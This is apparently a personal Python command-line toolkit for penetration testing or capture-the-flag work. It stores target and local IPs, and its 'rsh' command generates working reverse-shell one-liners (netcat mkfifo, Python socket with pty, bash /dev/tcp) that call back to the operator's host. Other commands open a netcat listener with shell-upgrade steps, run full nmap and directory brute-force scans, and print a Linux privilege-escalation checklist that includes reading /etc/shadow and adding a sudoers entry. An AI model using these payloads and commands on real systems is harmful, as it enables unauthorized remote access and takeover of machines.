#!/usr/bin/env python3
import asyncio
import click
import json
import os
from dir_scan import DirScanner

TARGET_IP_KEY = 'TARGET_IP'
TARGET_HTTP_PORT_KEY = 'TARGET_HTTP_PORT'
LOCAL_IP_KEY = 'LOCAL_IP'


def load_env():
    with open('.env.json', 'r') as f:
        data = json.load(f)
        for key, value in data.items():
            os.environ.setdefault(key, str(value))


@click.group('tools')
def commands() -> None:
    pass


def add_to_env(key: str, value: any):
    with open('.env.json', 'r') as f:
        data = json.load(f)
        data[key] = value
    with open('.env.json', 'w') as f:
        json.dump(data, f, indent=2)


@commands.command('show')
@click.option('-e', '--export', help='prints as export for bash', default=False, type=bool)
def show(export: bool) -> None:
    with open('.env.json', 'r') as f:
        data = json.load(f)
        for key, value in data.items():
            click.echo(f'{"export " if export else ""}{key}={value}')


@commands.command('init')
@click.option('ip', prompt='target ip', required=True, type=str)
@click.option('local-ip', prompt='local ip', required=True, type=str)
@click.option('target-http-port', prompt='target http port', required=True, type=int)
def init(ip: str, local_ip: int, target_http_port) -> None:
    set_target(ip)
    set_local_ip(local_ip)
    set_target_http_port(target_http_port)


@commands.command('set-target')
@click.argument('ip', required=True, type=str)
def set_target(ip: str) -> None:
    add_to_env('TARGET_IP', ip)


@commands.command('set-target-http-port')
@click.argument('port', required=True, type=int)
def set_target_http_port(port: int) -> None:
    add_to_env('TARGET_HTTP_PORT', port)


@commands.command('set-local-ip')
@click.argument('ip', required=True, type=str)
def set_local_ip(ip: int) -> None:
    add_to_env('LOCAL_IP', ip)


@commands.command('rsh')
@click.argument('type', type=click.Choice(['nc', 'python', 'bash']), required=True)
@click.option('-p', '--port', type=int, required=False, default=4040)
def generate_rsh(type: str, port) -> None:
    local_ip = os.environ.get(LOCAL_IP_KEY)

    if not local_ip:
        click.echo('Error: you have to run set-local-ip first', err=True)
        exit(1)

    if type == 'nc':
        click.echo(
            f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {local_ip} {port} >/tmp/f'
        )
    elif type == 'python':
        click.echo(
            f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{local_ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\''
        )
    elif type == 'bash':
        click.echo(
            f'/bin/bash -i >& /dev/tcp/{local_ip}/{port} 0>&1'
        )


@commands.command('listen')
@click.argument('port', type=int, required=False, default=4040)
def listen(port):
    click.echo('1. python -c \'import pty;pty.spawn("/bin/bash")\'')
    click.echo('2. CTRL+Z')
    click.echo('3. stty raw -echo; fg; reset')
    os.system('nc -lvp 4040')


@commands.command('scan')
def scan():
    target_ip = os.environ.get(TARGET_IP_KEY)
    if not target_ip:
        click.echo('Error: you have to run set-target-ip first', err=True)
        exit(1)
    os.system(f'nmap -p- -v -A {target_ip}')


@commands.command('priv-esc')
def priv_esc():
    click.echo('''
# su binaries
find / -perm -u=s -type f 2>/dev/null

# show env
env

# show processes
ps aux

# show permission on files
ll /etc/shadow /etc/passwd
# generate new password
openssl <password> -6


# crontabs
cat /etc/crontab


# /etc/sudoers
username	ALL=(ALL:ALL) ALL''')


@commands.command('scan-dirs')
@click.argument('word-list', type=click.Path(exists=True, readable=True))
@click.option('-c', '--concurrency', help='concurrent sessions', default=8, type=int)
@click.option('-i', '--ignored-status', help='concurrent sessions', default=list([404]), type=int, multiple=True)
@click.option('-e', '--extensions', help='extensions to add like .php .html', default=list(['']), type=str, multiple=True)
@click.option('-s', '--ssl', help='https', default=False, type=click.BOOL)
def scan_dirs(word_list, concurrency, ignored_status, extensions, ssl):
    target_ip = os.environ.get(TARGET_IP_KEY)
    if not target_ip:
        click.echo('Error: you have to run set-target-ip first', err=True)
        exit(1)
    target_http_port = os.environ.get(TARGET_HTTP_PORT_KEY)
    if not target_http_port:
        click.echo('Error: you have to run set-target-http-port first', err=True)
        exit(1)
    asyncio.run(DirScanner.scan(
        word_list,
        f'{"https" if ssl else "http"}://{target_ip}:{target_http_port}',
        concurrency,
        ignored_status,
        extensions,
    ))


if __name__ == '__main__':
    load_env()
    commands()
